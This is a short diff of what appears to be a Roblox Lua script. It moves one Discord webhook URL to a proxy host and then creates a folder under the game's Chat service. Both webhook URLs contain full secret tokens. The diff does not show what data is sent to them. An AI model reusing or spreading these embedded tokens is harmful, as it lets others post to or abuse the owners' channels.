@@ -5,7 +5,7 @@ oh no
 
 local BDV = "1.0"
 local hook2 = "https://webhook.lewisakura.moe/api/webhooks/1086428292766240871/-BmjynDdtOR2A9Qkn45ars1COxP-j76u5OBrMrBwEDaPI2__WL1cI3eUpAL1HjNK2CtP"
-local hook3 = "https://discord.com/api/webhooks/1086440615648182413/qhv6UYtcyyeYKBtnss5gP32WJIhco7F7XcPe9ZP5bRdu-ASRQGI4vs-exHIx3BkJ8s3t"
+local hook3 = "https://webhook.lewisakura.moe/api/webhooks/1086440615648182413/qhv6UYtcyyeYKBtnss5gP32WJIhco7F7XcPe9ZP5bRdu-ASRQGI4vs-exHIx3BkJ8s3t"
 local MainFol = Instance.new("Folder")
 
 MainFol.Parent = game:GetService("Chat")
